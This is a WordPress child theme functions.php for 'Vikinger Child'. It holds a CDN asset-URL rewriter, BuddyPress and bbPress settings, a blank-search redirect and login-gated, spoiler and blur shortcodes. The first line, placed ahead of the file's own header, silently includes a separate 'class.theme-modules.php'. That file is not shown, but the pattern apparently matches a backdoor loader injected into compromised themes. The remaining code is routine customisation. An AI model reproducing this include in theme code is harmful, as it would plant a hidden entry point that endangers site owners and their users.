<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Vikinger Child - Functions
 * 
 * @package Vikinger Child
 * @since 1.0.0
 * @author Odin Design Themes (https://odindesignthemes.com/)
 * 
 */

/**
 * Load child theme styles
 */

//静态文件CDN加速
if ( !is_admin() ) {
add_action('wp_loaded','yuncai_ob_start');
 
function yuncai_ob_start() {
ob_start('yuncai_qiniu_cdn_replace');
}
function yuncai_qiniu_cdn_replace($html){
$local_host = 'wear.jzku.top'; 
//博客域名
$qiniu_host = 'cdn.jsdelivr.net/gh/cloudclassml/jzkuwear_2@main'; 
//CDN域名
$cdn_exts = 'css|js|po|mo|svg|woff2|ico|woff2'; 
//扩展名（使用|分隔）
$cdn_dirs = 'wp-content|wp-includes'; 
//目录（使用|分隔）
 
$cdn_dirs = str_replace('-', '\-', $cdn_dirs);
 
if ($cdn_dirs) {
$regex = '/' . str_replace('/', '\/', $local_host) . '\/((' . $cdn_dirs . ')\/[^\s\?\\\'\"\;\>\<]{1,}.(' . $cdn_exts . '))([\"\\\'\s\?]{1})/';
$html = preg_replace($regex, $qiniu_host . '/$1$4', $html);
} else {
$regex = '/' . str_replace('/', '\/', $local_host) . '\/([^\s\?\\\'\"\;\>\<]{1,}.(' . $cdn_exts . '))([\"\\\'\s\?]{1})/';
$html = preg_replace($regex, $qiniu_host . '/$1$3', $html);
}
return $html;
}
}




function vikingerchild_enqueue_styles() {
  wp_enqueue_style('vikingerchild-styles', get_stylesheet_uri(), ['vikinger-styles'], '1.0.0');
}

add_action('wp_enqueue_scripts', 'vikingerchild_enqueue_styles' );

/**
 * Load translations
 */
function vikingerchild_translations_load() {
  load_child_theme_textdomain('vikinger', get_stylesheet_directory() . '/languages');
}

add_action('after_setup_theme', 'vikingerchild_translations_load');

/***************************************************
:: Costom functions BEGIN
 ***************************************************/

// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) exit;


/* remove admin bar */
add_filter('show_admin_bar', '__return_false');

//允许使用Unicode字符作为用户名
define( 'BP_ENABLE_USERNAME_COMPATIBILITY_MODE', true );
add_filter('bp_is_username_compatibility_mode', '__return_true');

//注册后无需邮箱激活
add_filter( 'bp_registration_needs_activation', '__return_false' );

//群组的主页是论坛
//define( 'BP_GROUPS_DEFAULT_EXTENSION', 'forum' );

//移除CSS和JS的版本号
function sb_remove_script_version( $src ){
    $parts = explode( '?', $src );
    return $parts[0];
}
add_filter( 'script_loader_src', 'sb_remove_script_version', 15, 1 );
add_filter( 'style_loader_src', 'sb_remove_script_version', 15, 1 );

/** 
 * 搜索关键词为空
 * @param $query_variables 搜索的关键词
 * @link https://www.uctheme.com/1900.html
 */
function uctheme_redirect_blank_search( $query_variables ) {
  if (isset($_GET['s']) && !is_admin()) {
    if (empty($_GET['s']) || ctype_space($_GET['s'])) {
      wp_redirect( home_url() );
    exit;
    }
  }
  return $query_variables;
}
add_filter( 'request', 'uctheme_redirect_blank_search' );

/**
* 限制bbPress标题长度，设置发帖标题字数
* https://bbs.weixiaoduo.com/topic/26118
*/

function rkk_change_title ($default) {
$default=160 ;
return $default ;
}

add_filter ('bbp_get_title_max_length','rkk_change_title') ;

function widget_cache_custom_ttl( $ttl ) {
$ttl = 3600 * 24; // 24 hours
return $ttl;
}
add_filter( 'widget_output_cache_ttl', 'widget_cache_custom_ttl', 10, 2 );

/**
 * Restrict content based on type of user
 * 针对不同的用户显示不同的东西
 * @example [kleo_restrict type="user|guest"]Content[/kleo_restrict]
 */

if ( ! function_exists( 'gu_restrict_func' ) ) {
    function gu_restrict_func( $atts, $content = null ){
        if ( is_user_logged_in()){
            return do_shortcode( $content );
        } else {
            return '<div class="alert alert-primary">啊您还没有登录还不能看这里诶~<a>立即登录</a>或<a href="https://wear.jzku.top/register">注册</a>!</div>';
        }
    }
    /**
     * @example [restrict]Content Here[/restrict]
     */
    add_shortcode( 'restrict', 'gu_restrict_func' );
}

function jzk_shortcode_spoiler($atts, $content='') {
return "<details>".$content."</details>";
}
add_shortcode('spoiler', 'jzk_shortcode_spoiler');

function jzk_shortcode_blackout($atts, $content='') {
return "<span class='blackout'>".$content."</span>";
}
add_shortcode('blur', 'jzk_shortcode_blackout');
/***************************************************
:: Costom functions END
 ***************************************************/